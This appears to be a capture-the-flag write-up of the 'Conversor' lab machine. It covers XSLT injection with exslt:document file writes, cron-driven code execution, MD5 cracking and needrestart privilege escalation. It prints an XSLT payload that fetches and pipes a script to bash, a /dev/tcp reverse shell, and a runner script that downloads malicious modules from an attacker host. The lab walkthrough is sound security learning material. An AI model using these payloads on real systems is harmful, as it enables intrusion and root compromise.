## About

Conversor was a Medium Linux machine running a Flask web application designed to convert Nmap XML scan results into HTML format using XSLT stylesheets. The challenge revolves around exploiting XSLT injection vulnerabilities to achieve arbitrary file write, leveraging a cron job for remote code execution, and cracking weak password hashes to gain SSH access. Privilege escalation is achieved through the exploitation of a vulnerable needrestart binary that can be executed with sudo privileges, ultimately granting root access.

## Reconnaissance

The port scan revealed two ports listening on TCP (22/80): OpenSSH 8.9p1 and Apache httpd 2.4.52 running on Ubuntu.

The web server redirected to `http://conversor.htb`, so the domain was added to `/etc/hosts`.

The website presented itself as "Conversor" - a service that transforms Nmap XML scan results into a more visually appealing format using XSLT stylesheets. Users could upload their XML files along with custom XSLT sheets, or download a template XSLT file provided by the service.

After registering an account and logging in, the conversion functionality was tested by uploading an Nmap scan XML along with the provided XSLT template.

To identify the XSLT processor and its capabilities, a custom XSLT file was uploaded that extracted system properties:

```xml
<p><xsl:value-of select="system-property('xsl:version')" /></p>
<p><xsl:value-of select="system-property('xsl:vendor')" /></p>
<p><xsl:value-of select="system-property('xsl:vendor-url')" /></p>
```

The results confirmed the server was using `libxslt` version 1.0, which supports the EXSLT `document()` function for writing files:

```
1.0
libxslt
http://xmlsoft.org/XSLT/
```

## Source Code Analysis

The application provided its source code for download at http://conversor.htb/static/source_code.tar.gz.

The installation documentation (`install.md`) revealed a critical cron job that executed all Python files in `/var/www/conversor.htb/scripts/` every minute as the `www-data` user:

`* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done`

The `/convert` route in `app.py` contained an XSLT injection vulnerability. While the XML parser had protections against XXE attacks, the XSLT processor had no restrictions:

```python
@app.route('/convert', methods=['POST'])
def convert():
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    
    # Saves files without validation
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    
    # XSLT processed without sanitization
    parser = etree.XMLParser(resolve_entities=False, no_network=True)
    xml_tree = etree.parse(xml_path, parser)
    xslt_tree = etree.parse(xslt_path)
    transform = etree.XSLT(xslt_tree)
    result_tree = transform(xml_tree)
```

## Initial Access

With the ability to control XSLT processing and knowledge of the cron job, an exploit chain was crafted to achieve remote code execution.

A malicious XSLT payload was created using the `exslt:document()` function to write a Python file to `/var/www/conversor.htb/scripts/shell.py`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.160:8000/shell.sh|bash")
        </shell:document>
    </xsl:template>
</xsl:stylesheet>
```

This Python file would download and execute a reverse shell script from an HTTP server:

```bash
bash -i >& /dev/tcp/10.10.14.160/9001 0>&1
```

After uploading the malicious XSLT file through the web interface, the cron job executed the Python file within a minute, establishing a reverse shell as `www-data`.

## Lateral Movement

After gaining access as `www-data`, the SQLite database used by the application was examined at `instance/users.db`. The database contained MD5 password hashes for registered users, including one for `fismathack`:

```
fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
```

<img width="1907" height="483" alt="8" src="https://github.com/user-attachments/assets/4af94322-93ad-42ca-b979-db07e33fb848" />

The MD5 hash was quickly cracked using the _rockyou.txt_ wordlist with hashcat, revealing the plaintext password: `Keepmesafeandwarm`. SSH access was then obtained using these credentials.

## Privilege Escalation

The user's privileges were enumerated using `sudo -ll`, which revealed that `fismathack` could run `/usr/sbin/needrestart` as any user without a password:

```
Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
        /usr/sbin/needrestart
```

Checking the version revealed `needrestart 3.7`, which is vulnerable to multiple CVEs related to local privilege escalation (CVE-2024-48990, CVE-2024-48991, CVE-2024-48992).

The vulnerability allows arbitrary code execution through environment variable manipulation when `needrestart` scans for outdated libraries. An exploit was crafted that hijacked Python's import mechanism by creating malicious modules in `/tmp/malicious/`.

The exploit script `runner.sh` set up the malicious environment:

```bash
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib

curl http://10.10.14.160:8000/__init__.so -o /tmp/malicious/importlib/__init__.so
curl http://10.10.14.160:8000/e.py -o /tmp/malicious/e.py

echo "Run: 'sudo needrestart' in another shell."
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

The malicious Python module spawned a root shell:

```python
import pty; pty.spawn("/bin/bash")
```

After setting up the HTTP server and executing the exploit, running `sudo needrestart` in another SSH session triggered the vulnerability and granted root access.

## Conclusion

The Conversor machine demonstrated a multi-stage attack path from web application exploitation to privilege escalation. The key lessons learned from this machine included:

- **XSLT injection remained a critical vulnerability** - The lack of XSLT input validation allowed arbitrary file write capabilities that bypassed XML security controls

- **Source code disclosure accelerated exploitation** - Access to the application's source code revealed the cron job mechanism that enabled RCE

- **Weak password hashing was exploited** - MD5 hashes without salts were quickly cracked using standard wordlists

- **Misconfigured sudo privileges provided escalation paths** - Running `needrestart` with sudo privileges exposed the system to known CVEs that granted root access
